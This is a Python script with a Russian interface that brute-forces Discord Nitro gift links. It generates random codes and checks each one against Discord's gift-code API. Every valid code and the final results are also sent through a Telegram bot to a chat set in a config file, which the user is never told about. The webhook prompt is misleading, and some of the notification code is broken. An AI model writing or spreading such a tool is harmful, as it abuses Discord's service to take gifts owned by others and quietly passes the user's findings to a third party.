import ctypes
import string
import os
import time
import telebot
from discord_webhook import DiscordWebhook
import requests
import numpy
from config import id, token
from colorama import Fore

USE_WEBHOOK = True

bot = telebot.TeleBot(token=token)

# check if user is connected to internet
url = "https://github.com"
try:
    response = requests.get(url)  # Get the responce from the url
    print(Fore.MAGENTA + "Проверка интернета...")
    time.sleep(0.4)
except requests.exceptions.ConnectionError:
    # Tell the user
    input(Fore.RED + "Проверьте подключение к интернету!\nНажми клавишу enter что бы выйти")
    exit()  # Exit program


class NitroGen:  # Initialise the class
    def __init__(self):  # The initaliseaiton function
        self.fileName = "Nitro Codes.txt"  # Set the file name the codes are stored in

    def main(self):  # The main function contains the most important code
        os.system('cls' if os.name == 'nt' else 'clear')  # Clear the screen
        if os.name == "nt":  # If the system is windows
            print("")
            ctypes.windll.kernel32.SetConsoleTitleW(
                "Нитро-генератор")  # Change the
        else:  # Or if it is unix
            print(f'\33]0;Нитро-генератор\a',end='', flush=True)  # Update title of command prompt
        self.slowType(Fore.MAGENTA +"Нитро-генератор, ремейк от: тг @imzloyop", .02)
        time.sleep(0.1)  # Wait a little more
        # Print the first question
        self.slowType(Fore.MAGENTA +
            "\nВведи количество ссылок на проверку: ", .02, newLine=False)

        try:
            num = int(input(''))  # Ask the user for the amount of codes
        except ValueError:
            input(Fore.RED +"Введи число!\nНажми клавишу enter что бы выйти")
            exit()  # Exit program

        if USE_WEBHOOK:
            # Get the webhook url, if the user does not wish to use a webhook the message will be an empty string
            self.slowType(
                Fore.MAGENTA + "Нажми клавишу enter: ", .02, newLine=False)
            url = input('')  # Get the awnser
            # If the url is empty make it be None insted
            webhook = url if url != "" else None
            
            if webhook is not None:
                DiscordWebhook(  # Let the user know it has started logging the ids
                        url=url,
                        content=f"```Начинается проверка ссылок!\nЯ выведу тебе корректные ссылки на нитро```"
                    ).execute()

        # print() # Print a newline for looks

        valid = []  # Keep track of valid codes
        invalid = 0  # Keep track of how many invalid codes was detected
        chars = []
        chars[:0] = string.ascii_letters + string.digits

        # generate codes faster than using random.choice
        c = numpy.random.choice(chars, size=[num, 23])
        for s in c:  # Loop over the amount of codes to check
            try:
                code = ''.join(x for x in s)
                url = f"https://discord.gift/{code}"  # Generate the url

                result = self.quickChecker(url, webhook)  # Check the codes

                if result:  # If the code was valid
                    # Add that code to the list of found codes
                    valid.append(url)
                else:  # If the code was not valid
                    invalid += 1  # Increase the invalid counter by one
            except KeyboardInterrupt:
                # If the user interrupted the program
                print("\nInterrupted by user")
                break  # Break the loop

            except Exception as e:  # If the request fails
                print(f"  | {url} ")  # Tell the user an error occurred

            if os.name == "nt":  # If the system is windows
                ctypes.windll.kernel32.SetConsoleTitleW(
                    f"Нитро-генератор - {len(valid)} работают | {invalid} не работают - ремейк от: тг @imzloyop")  # Change the title
                print("")
            else:  # If it is a unix system
                # Change the title
                print(
                    f'\33]0;Нитро-генератор - {len(valid)} работают | {invalid} не работают - ремейк от: тг @imzloyop\a', end='', flush=True)

        print(Fore.MAGENTA + f"""
Результаты:
 Работают: {len(valid)}
 Не работают: {invalid}
 Рабочие коды: {', '.join(valid)}""")  # Give a report of the results of the check
        bot.send_message(chat_id=id,text=f"""
Результаты:
 Работают: {len(valid)}
 Не работают: {invalid}
 Рабочие коды: {', '.join(valid)}""")

        # Tell the user the program finished
        input(Fore.MAGENTA + "\nКонец! Нажми клавишу enter 5 раз что бы выйти.")
        [input(i) for i in range(4, 0, -1)]  # Wait for 4 enter presses

    # Function used to print text a little more fancier
    def slowType(self, text: str, speed: float, newLine=True):
        for i in text:  # Loop over the message
            # Print the one charecter, flush is used to force python to print the char
            print(i, end="", flush=True)
            time.sleep(speed)  # Sleep a little before the next one
        if newLine:  # Check if the newLine argument is set to True
            print()  # Print a final newline to make it act more like a normal print statement

    def quickChecker(self, nitro:str, notify=None):  # Used to check a single code at a time
        # Generate the request url
        url = f"https://discordapp.com/api/v9/entitlements/gift-codes/{nitro}?with_application=false&with_subscription_plan=true"
        response = requests.get(url)  # Get the response from discord

        if response.status_code == 200:  # If the responce went through
            # Notify the user the code was valid
            print(Fore.LIGHTGREEN_EX + f" РАБОТАЕТ | {nitro} ", flush=True,
                  end="" if os.name == 'nt' else "\n")
            bot.send_message(chat_id=id,text=f'Новая рабочая ссылка!\n{nitro}')
            with open("Nitro Codes.txt", "w") as file:  # Open file to write
                # Write the nitro code to the file it will automatically add a newline
                file.write(nitro)

            if notify is not None:  # If a webhook has been added
                DiscordWebhook(  # Send the message to discord letting the user know there has been a valid nitro code
                    url=url,
                    content=f"РАБОТАЮЩЕЕ НИТРО!\n{nitro}"
                ).execute()

            return True  # Tell the main function the code was found

        # If the responce got ignored or is invalid ( such as a 404 or 405 )
        else:
            # Tell the user it tested a code and it was invalid
            print(Fore.LIGHTRED_EX + f" НЕ РАБОТАЕТ | {nitro} ", flush=True,
                  end="" if os.name == 'nt' else "\n")
            return False  # Tell the main function there was not a code found


if __name__ == '__main__':
    Gen = NitroGen()  # Create the nitro generator object
    Gen.main()  # Run the main code
    bot.infinity_polling()
